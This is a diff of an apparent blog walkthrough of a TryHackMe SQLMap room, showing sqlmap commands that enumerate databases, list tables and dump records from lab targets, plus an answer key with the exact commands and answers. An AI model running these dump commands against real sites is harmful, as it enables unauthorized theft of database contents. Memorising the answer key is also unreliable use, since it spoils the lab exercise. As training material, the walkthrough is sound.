@@ -91,12 +91,12 @@ SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabi
 As this is a command-line tool, you must open your Linux OS terminal to use it. The \`--help\` command with SQLMap will list all the available flags you can use. If you don't want to manually add the flags to each command, use the \`--wizard\` flag with SQLMap. When you use this flag, the tool will guide you through each step and ask questions to complete the scan, making this a perfect option for beginners.
 \`\`\`
 user@ubuntu:~$ sqlmap --wizard
-        ___
-       __H__
- ___ ___["]_____ ___ ___  {1.2.4#stable}
-|_ -| . [)]     | .'| . |
-|___|_  ["]_|_|_|__,|  _|
-      |_|V          |_|   http://sqlmap.org
+        \_\_\_
+       \_\_H\_\_
+ \_\_\_ \_\_\_["]\_\_\_\_\_ \_\_\_ \_\_\_  {1.2.4#stable}
+|\_ -| . [)]     | .'| . |
+|\_\_\_|\_  ["]\_|\_|\_|\_\_,|  \_|
+      |\_|V          |\_|   http://sqlmap.org
 
 [text removed]
 
@@ -106,7 +106,7 @@ user@ubuntu:~$ sqlmap --wizard
 Please enter full target URL (-u):
 \`\`\`
 
-The \`--dbs\` flag helps you to extract all the database names. Once you get to know the database names, you can extract information about the tables of that database by using \`-D database_name --tables\`. After obtaining the tables, if you want to enumerate the records in those tables, you can use \`-D database_name -T table_name --dump\`. The different flags in the SQLMap tool let you extract detailed information from the databases. Now, let's take a practical scenario and use all the above flags to exploit a web application vulnerable to SQL injection.
+The \`--dbs\` flag helps you to extract all the database names. Once you get to know the database names, you can extract information about the tables of that database by using \`-D database\_name --tables\`. After obtaining the tables, if you want to enumerate the records in those tables, you can use \`-D database\_name -T table\_name --dump\`. The different flags in the SQLMap tool let you extract detailed information from the databases. Now, let's take a practical scenario and use all the above flags to exploit a web application vulnerable to SQL injection.
 
 The first step is to look for a possible vulnerable URL or request. You may often come across some URLs that use GET parameters to retrieve the data. For example, a URL like \`http://sqlmaptesting.thm/search?cat=1\` uses a parameter \`cat\` that takes the value \`1\`. If you see any web application using \`GET\` parameters in the URLs to retrieve data, you can test that URL with the \`-u\` flag in the SQLMap tool. This is considered to be HTTP GET-based testing. This approach is followed when the application uses \`GET\` parameters in the URL to retrieve data from the searches.
 
@@ -115,11 +115,11 @@ In real-world scenarios, many web applications rely on cookies to maintain user 
 We will use a supposedly vulnerable website URL: \`http://sqlmaptesting.thm\` for the demonstration. Suppose that this website has a search option, and when you click on this search option and search for something, the URL becomes \`http://sqlmaptesting.thm/search/cat=1\`, which uses the GET parameter \`cat=1\` in the URL to extract information from the database. As we know, URLs that have GET parameters can be vulnerable to SQL injection; let us scan this URL to identify if it has any SQL injection vulnerability.
 \`\`\`
 user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
-      __H__
- ___ ___[']_____ ___ ___  {1.2.4#stable}
-|_ -| . [,]     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
-      |_|V          |_|   http://sqlmap.org
+      \_\_H\_\_
+ \_\_\_ \_\_\_[']\_\_\_\_\_ \_\_\_ \_\_\_  {1.2.4#stable}
+|\_ -| . [,]     | .'| . |
+|\_\_\_|\_  [(]\_|\_|\_|\_\_,|  \_|
+      |\_|V          |\_|   http://sqlmap.org
 
 [text removed]
 [08:43:49] [INFO] testing connection to the target URL
@@ -166,11 +166,11 @@ The results from the command we executed for our target \`http://sqlmaptesting.t
 To fetch the databases, we use the flag \`--dbs\`. Let's try this flag out with our vulnerable URL:
 \`\`\`
 user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
-       __H__
- ___ ___[(]_____ ___ ___  {1.2.4#stable}
-|_ -| . ["]     | .'| . |
-|___|_  [,]_|_|_|__,|  _|
-      |_|V          |_|   http://sqlmap.org
+       \_\_H\_\_
+ \_\_\_ \_\_\_[(]\_\_\_\_\_ \_\_\_ \_\_\_  {1.2.4#stable}
+|\_ -| . ["]     | .'| . |
+|\_\_\_|\_  [,]\_|\_|\_|\_\_,|  \_|
+      |\_|V          |\_|   http://sqlmap.org
 
 [text removed]
 [08:50:46] [INFO] resuming back-end DBMS' mysql' 
@@ -202,11 +202,11 @@ Database: acuart
 Now that we have all the available table names of the database, let's dump the records present in the \`thomas\` table. To do so, we will define the database with the \`-D\` flag, the table with the \`-T\` flag, and for extracting the records of the table, we will use the \`--dump\` flag.
 \`\`\`
 user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
-       __H__
- ___ ___[(]_____ ___ ___  {1.2.4#stable}
-|_ -| . [(]     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
-      |_|V          |_|   http://sqlmap.org
+       \_\_H\_\_
+ \_\_\_ \_\_\_[(]\_\_\_\_\_ \_\_\_ \_\_\_  {1.2.4#stable}
+|\_ -| . [(]     | .'| . |
+|\_\_\_|\_  [(]\_|\_|\_|\_\_,|  \_|
+      |\_|V          |\_|   http://sqlmap.org
 
 [text removed]
 [08:51:48] [INFO] resuming back-end DBMS' mysql' 
@@ -241,7 +241,7 @@ Table: thomas
 \`\`\`
 
 However, unlike the URL used for testing above, you can also use POST-based testing, where the application sends data in the request's body instead of the URL. Examples of this could be login forms, registration forms, etc. To follow this approach, you must intercept a POST request on the login or registration page and save it as a text file. You can use the following command to input that request saved in the text file to the SQLMap tool:
-\`user@ubuntu:~$ sqlmap -r intercepted_request.txt\`
+\`user@ubuntu:~$ sqlmap -r intercepted\_request.txt\`
 
 **Note:** Learning how to intercept and capture POST requests is out-of-scope for this room.
 
@@ -258,7 +258,7 @@ What would be the full command of SQLMap for extracting all tables from the "mem
 
 ### Task 4 Practical Exercise
 
-The web application has a login page that is hosted at \`http://MACHINE_IP/ai/login\`.
+The web application has a login page that is hosted at \`http://MACHINE\_IP/ai/login\`.
 
 In the previous task, we saw that if we see GET parameters in the URL, they might be vulnerable to SQL injection, and we can copy that URL to use it with SQLMap. We also saw that if there is a POST request and the data is sent inside the body rather than the URL, we can intercept the request and use it with the SQLMap tool to exploit a SQL injection vulnerability, if there is any.
 
@@ -268,7 +268,7 @@ So, to get the complete URL along with its GET parameters, we need to right-clic
 <img src="/blogs/tryhackme/sqlmap-the-basics/6645aa8c024f7893371eb7ac-1728644607260.png">
 
 **Note**: If you are unable to extract the URL by the above process, you can copy it from below:
-\`http://10.65.130.253/ai/includes/user_login?email=test&password=test\`
+\`http://10.65.130.253/ai/includes/user\_login?email=test&password=test\`
 
 Run the commands as discussed in the previous task on this URL and answer the questions given in this task. Also, remember to include your URL inside single quotes \`'\`. This is to avoid errors with special characters in the terminal such as \`?\`.
 
@@ -283,19 +283,19 @@ Important Note: You may not get the results by the simple scan; add \`--level=5\
 How many databases are available in this web application?
 **Answer:** 6
 **Reason:**
-1. Run \`sqlmap -u 'http://TARTGET_IP/ai/includes/user_login?email=test&password=test' --dbs --level=5\`.
+1. Run \`sqlmap -u 'http://TARTGET\_IP/ai/includes/user\_login?email=test&password=test' --dbs --level=5\`.
 2. Look at the information provided by the output.
 
 What is the name of the table available in the "ai" database?
 **Answer:** user
 **Reason:**
-1. Run \`sqlmap -u 'http://TARTGET_IP/ai/includes/user_login?email=test&password=test' -D ai --tables --level=5\`.
+1. Run \`sqlmap -u 'http://TARTGET\_IP/ai/includes/user\_login?email=test&password=test' -D ai --tables --level=5\`.
 2. Look at the information provided by the output.
 
 What is the password of the email test@chatai.com?
 **Answer:** 12345678
 **Reason:**
-1. Run \`sqlmap -u 'http://TARTGET_IP/ai/includes/user_login?email=test&password=test' -D ai -T user --dump --level=5\`.
+1. Run \`sqlmap -u 'http://TARTGET\_IP/ai/includes/user\_login?email=test&password=test' -D ai -T user --dump --level=5\`.
 2. Look at the information provided by the output.
 `
 }
